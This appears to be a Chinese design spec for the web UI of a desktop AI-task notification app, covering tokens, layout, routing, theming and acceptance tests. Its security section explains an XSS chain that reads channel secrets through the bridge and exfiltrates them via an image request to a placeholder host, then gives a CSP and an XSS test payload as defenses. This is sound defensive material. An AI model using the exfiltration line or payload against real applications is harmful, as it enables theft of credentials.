## 1. 设计 token（`webui/assets/tokens.css`）

### 1.1 为什么不全抄 shadcn

外来方案给了一套 shadcn zinc 色板，直接抄有两个问题：

1. **主色 `#10b981` 上放白字只有 2.3:1**，做不了实心主按钮。
2. 项目现有的 13 对颜色已经过对比度验证（`archive/design-redesign.md` 2.2，D2 已追认），
   换一套等于把验证结果作废，且没有视觉收益。

**取 shadcn 的结构，不取它的色值。** 色值沿用现有 `Palette`，只补三样
tkinter 给不了的东西：`--ring`（带 alpha 的光环）、两层阴影、毛玻璃。

### 1.3 主按钮为什么是墨色而不是品牌色

`#00c29a` 上放白字是 **2.1:1**，放 `#003b31` 才够 4.5:1，但那个组合看起来像
"青绿底 + 深青字"，不像按钮。

所以沿用上一轮已经验证过的方案：**主操作 = 墨色实心，品牌色只表达"系统状态"**
（开关开着、通道通了、进度在走）。这条规则的价值在于：整屏看过去，
绿色的东西永远在告诉你"哪里是活的"，而不是"哪里能点"。

shadcn 的 `--primary` 在这里对应 `--ink`。**不要照抄成 `--primary: var(--brand)`。**

### 1.4 字体

```css
:root {
  --font: "Inter", "Microsoft YaHei UI", "PingFang SC", system-ui, sans-serif;
  --mono: "JetBrains Mono", "Consolas", ui-monospace, monospace;
}
body {
  font-family: var(--font);
  letter-spacing: -0.01em;          /* tkinter 做不到，web 上白拿 */
  -webkit-font-smoothing: antialiased;
}
```

Inter 只打包拉丁子集（`Inter.var.woff2`，约 100KB，D5 决策）。中文回退雅黑，
**不要试图打包中文字体**——一个思源黑体精简版也有 3MB，为了一个通知工具不值。

字号阶梯（只有 5 级，不许出现第 6 级）：

| 用途 | 字号/行高 | 字重 |
|---|---|---|
| 页面标题 | 20 / 28 | 600 |
| 卡片数字 | 28 / 32 | 600 + `tabular-nums` |
| 正文 / 表单 | 14 / 22 | 400 |
| 辅助说明 | 13 / 20 | 400 |
| 标签 / 徽章 | 12 / 16 | 500 |

数字必须加 `font-variant-numeric: tabular-nums`，否则统计数字刷新时会左右跳。

### 1.5 间距 / 圆角

```css
:root {
  --s1: 4px;  --s2: 8px;  --s3: 12px; --s4: 16px;
  --s5: 24px; --s6: 32px; --s7: 48px;
  --r-input: 8px;  --r-card: 12px;  --r-modal: 16px;  --r-pill: 999px;
```

**只允许这 7 个间距值。** 出现 13px、17px、20px 就是错的——上一轮 tkinter 版
有 61 个不同的 `S(n)` 取值，这就是"看起来不齐"的真正原因。

## 2. 壳布局

```
┌────────────┬──────────────────────────────────────────────┐
│            │  顶栏 56px：页面名 ······ 主题分段 · 总开关   │
│  侧栏      ├──────────────────────────────────────────────┤
│  240px     │                                              │
│            │  内容区  padding 32px                        │
│  logo 64   │  正文列 max-width 720，居中                  │
│  ──────    │                                              │
│  5 个导航  │                                              │
│  ──────    │                                              │
│  链路陈述  │                                              │
└────────────┴──────────────────────────────────────────────┘
```

| 尺寸 | 值 | 理由 |
|---|---|---|
| 侧栏宽 | 240 | 上一版 208 装不下"企业微信自建应用"这类长名，会截断 |
| 顶栏高 | 56 | 8 的倍数；48 太挤，64 显空 |
| 内容 padding | 32 | 内容列 720 + 两侧 32 = 784，1180 窗口下左右各余 118，留白不空 |
| 正文列 | 720 | 中文单行 40–45 字是舒适区，720/14px ≈ 50 字，偏宽一点点但可接受 |
| 导航行高 | 40 | 8 的倍数；点击区 ≥ 40 满足触控最小尺寸 |

### 2.1 侧栏

- 顶部：logo（30px）+ 「AI 任务通知」+ 「个人版 v1.2」，占 64px
- 导航：5 项，选中态 = `--bg-subtle` 底 + `--fg` 文字 + **左侧 3px 品牌色竖条**
  （方案里提的，比整块变色更克制）
- 底部：链路陈述一行（用 `insight.chain_sentence` 的返回值 + 语义等级配色），
  上面一条 `--border` 分隔线

**导航图标**：统一用 1.5px 线性描边（stroke），**不要混用实心方底**。
外来方案第 9 条批评的就是这个。用内联 SVG，不引图标库。

### 2.2 顶栏

- 左：当前页面名（20/600），**不画任何分隔线**
- 右：主题分段（跟随/浅色/深色）+ 总开关
- 底边 1px `--border`（唯一的横线，用来把顶栏和内容分开）

### 2.3 路由

```js
// 用 hash，不用 history.pushState —— pywebview 的 file:// 下 pushState 会失效
const ROUTES = ['channels', 'triggers', 'templates', 'status', 'guide'];
function go(name) { location.hash = '#' + name; render(name); }
window.addEventListener('hashchange', () => render(location.hash.slice(1)));
```

5 个页面**全部预加载进 DOM**（`<section data-page="status" hidden>`），
切换只做 `hidden` 切换 + 200ms 淡入上移。

理由：这 5 个页面加起来不到 3000 个节点，浏览器处理得了；而每次重新渲染
会导致表单状态丢失、滚动位置重置——tkinter 版为了这个专门写了
`_save_view/_restore_view`，web 上直接不销毁就没有这个问题。

### 2.4 CSP 与 XSS 底线（安全要求，不是风格要求）

W1 为了让画面能上屏，给 WebView2 加了 `--no-sandbox`（见 `app.py` 第 162–171 行注释）。
这个决定把「一个渲染漏洞」升级成「本地代码执行」，因为这个应用会**把不可信文本画到页面上**：

| 不可信来源 | 谁写的 | 会出现在哪 |
|---|---|---|
| 通知标题 / 正文 | AI 任务的产出，任意文本 | 状态页的最近记录、消息模板预览 |
| 通道报错原文 | 远端服务返回的 body | 通道页的测试结果 |
| 日志行 | 上面两者的拼接 | 状态页 |

这些文本一旦走 `innerHTML`，一个 `<img src=x onerror=...>` 就能执行脚本。而
`window.pywebview.api` 就在同一个上下文里——**脚本可以调 `config_get()` 拿到全部通道的
key / secret，再用 `new Image().src = "http://x/?" + data` 发出去**。图片请求不受 CORS
限制，这条链是通的，不是理论推演。

两道防线，**都必须有**。

**① `index.html` 必须带 CSP**（W1 的占位页没有，W2 的正式壳必须有）：

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'none';
  form-action 'none';
  base-uri 'none';
  object-src 'none'">
```

逐条的理由，别删你没看懂的：

| 指令 | 为什么 | 删掉的后果 |
|---|---|---|
| `script-src 'self'`（**无 `'unsafe-inline'`**） | 废掉 `<img onerror>`、内联 `<script>`、`javascript:` URL 三种注入 | 整条链的总闸没了 |
| `connect-src 'none'` | 前端不需要发网络请求，所有网络都在 Python 侧（`channels.py`） | `fetch()` 就能把配置传出去 |
| `img-src 'self' data:` | 只许本地图和 data URI，**不许外链图片** | `new Image().src` 这条带外通道还活着 |
| `style-src` 带 `'unsafe-inline'` | 要写行内 `style` 改宽度、进度条 | 样式注入的危害远小于脚本注入，这条可以让 |
| `object-src` / `base-uri` / `form-action` | 纵深防御，成本为零 | 少一层 |

**加完先确认 bridge 还活着。** pywebview 通过 `AddScriptToExecuteOnDocumentCreated`
注入 `window.pywebview`，宿主注入的脚本不受页面 CSP 约束，正常情况下不受影响。
如果加完 CSP 之后 `window.pywebview` 是 `undefined`，**先查 pywebview 版本，不要直接
删 CSP**——把现象写进汇报，我们再决定放宽哪一条。

**② 渲染不可信文本只许用 `textContent` / `createTextNode`。**

W1 的 `app.js` 已经在用 `textContent`（`$("#json").textContent = ...`），保持这个习惯。
下面这些**一律禁止**：

```js
el.innerHTML = x                 // 禁
el.insertAdjacentHTML(..., x)    // 禁
el.outerHTML = x                 // 禁
new Function(x) / eval(x)        // 禁
```

要拼结构就用 `document.createElement` + `append`；要批量建就用 `<template>` 克隆。
**"我就这一处图省事"就是漏洞的诞生方式**，所以这条同时写进 W3 / W4 的硬约束。

> 补充：`channels.py` 侧已经有 `sanitize.redact()`，但那是**脱敏**（抹掉 key），
> 不是**转义**（抹掉 `<`）。两者不能互相替代，前端该转义还得转义。

## 3. 状态页（定稿页）

### 3.1 结构

```
页面标题「运行状态」
一句话说明（今天发生了什么）

┌─────────┬─────────┬─────────┬─────────┐
│ 今日通知 │ 通道成功 │ 通道失败 │ 启用通道 │
│   19    │   19    │    0    │   2/10  │
└─────────┴─────────┴─────────┴─────────┘

通道状态            （列表：名字 + 状态徽章 + 最后发送时间）
──────────────────────────────────────
最近通知            （时间 + 结果点 + 摘要，最多 8 条）
──────────────────────────────────────
```

### 3.2 四张统计卡

- 白底 `--bg-card`、`--r-card` 圆角、`--shadow-md` 阴影
- 数字 28/600 + `tabular-nums`，从 0 滚到目标值 300ms `ease-out`
- **数字滚动只在首次进入时做一次**，切回来不重复（重复滚动会烦）
- 失败数为 0 时数字用 `--fg`，>0 时用 `--danger`（颜色是信号，不是装饰）

外来方案第 4 条批评"统计数字裸排没有卡片"——这里采纳。上一轮 P1 主动去卡片化
是判断失误：数据页需要容器把"一组数字"和"下面的列表"分开，这不是装饰。

### 3.3 空状态（方案 4.5 最后一条）

最近通知为空时**不许留白**，要有一句人话 + 一个出口：

```
还没收到通知。
发一条测试消息，看看链路通不通。        [发送测试]
```

空状态三件套：一句解释 + 一个动作 + 一个图标（线性，24px，`--fg-subtle`）。

### 3.4 加载态与错误态

| 态 | 表现 |
|---|---|
| 加载中 | 卡片位置显示骨架条（`--bg-subtle` 底色 + 1.4s 呼吸），**不要转圈** |
| 读配置失败 | 整页替换成一条错误说明 + 「重试」按钮 + 「打开日志目录」 |
| 单个通道异常 | 该行显示 `--danger` 徽章，不影响其它行 |

**不许出现 `alert()` / 白屏 / 控制台报错。**

## 4. 主题切换

```js
function setTheme(mode) {            // 'light' | 'dark' | 'system'
  const dark = mode === 'dark' ||
    (mode === 'system' && matchMedia('(prefers-color-scheme: dark)').matches);
  document.documentElement.dataset.theme = dark ? 'dark' : 'light';
  localStorage.setItem('wbn-theme', mode);
}
```

- 首屏要在 `<head>` 里内联一段同步脚本读 `localStorage`，否则会闪一下白（FOUC）
- `system` 模式要监听 `matchMedia` 的 change 事件，系统切了界面跟着切
- 主题写回 `config.json` 的 `ui.theme`（保持和 tkinter 版同一个字段，D4）

## 5. 验收（8 条，第 7 条是安全闸门）

| # | 验收项 | 标准 |
|---|---|---|
| 1 | 五页导航都能切 | 点击 + `hashchange` 都生效，刷新后停在当前页 |
| 2 | 浅色/深色/跟随 三态切换 | 即时生效，**无 FOUC**（录屏或连续截图） |
| 3 | 状态页四张卡数字正确 | 和 `insight.stats()` 输出逐项对照 |
| 4 | 对比度 | 所有文字 ≥ 4.5:1，非文本（边框/图标）≥ 3:1。**贴实测表**，不许"目测没问题" |
| 5 | **CSS 视口 733 / 900 / 1180 三档** | 不出现横向滚动条，卡片换行不重叠，侧栏不塌。**不许用窗口尺寸当口径**——本机 DPR 是 2.4（原因见 `architecture.md`），「880 窗口」在这里是 733 CSS，在正常机器上是 880。报告里必须同时写 `devicePixelRatio` 与 `innerWidth` |
| 6 | 无控制台报错 | DevTools Console 干净（`WBN_DEBUG=1` 开） |
| 7 | **XSS 打不穿** | 把 `<img src=x onerror="window.__xss=1">` 写进某个通道的 `label`（或伪造一条日志正文），重开页面：Console 里 `window.__xss` 必须是 `undefined`，页面上必须**原样显示**这串文字 |
| 8 | **每个可交互元素都有焦点环** | Tab 走一遍：导航项、主题分段控件、通知开关、按钮，**逐个**都要有 `box-shadow: 0 0 0 3px var(--ring)`。W2 只给 `.nav-item` 写了 `:focus-visible`，其余元素没有 |

第 4 条用脚本量，不要靠眼睛：

```js
// 贴进 DevTools Console，会打印所有不合规的节点
(() => {
  const lum = (c) => {
    const [r,g,b] = c.match(/\d+/g).slice(0,3).map(v => {
      v = v/255; return v <= .03928 ? v/12.92 : ((v+.055)/1.055)**2.4;
    });
    return .2126*r + .7152*g + .0722*b;
  };
  const ratio = (a,b) => { const [x,y] = [lum(a),lum(b)].sort((p,q)=>q-p);
    return (x+.05)/(y+.05); };
  const bgOf = (el) => { while (el) { const c = getComputedStyle(el).backgroundColor;
    if (c && !c.includes('rgba(0, 0, 0, 0)')) return c; el = el.parentElement; }
    return 'rgb(255,255,255)'; };
  document.querySelectorAll('*').forEach(el => {
    if (!el.textContent.trim() || el.children.length) return;
    const r = ratio(getComputedStyle(el).color, bgOf(el));
    if (r < 4.5) console.warn(r.toFixed(2), el.tagName, el.className, el.textContent.slice(0,20));
  });
})();
```
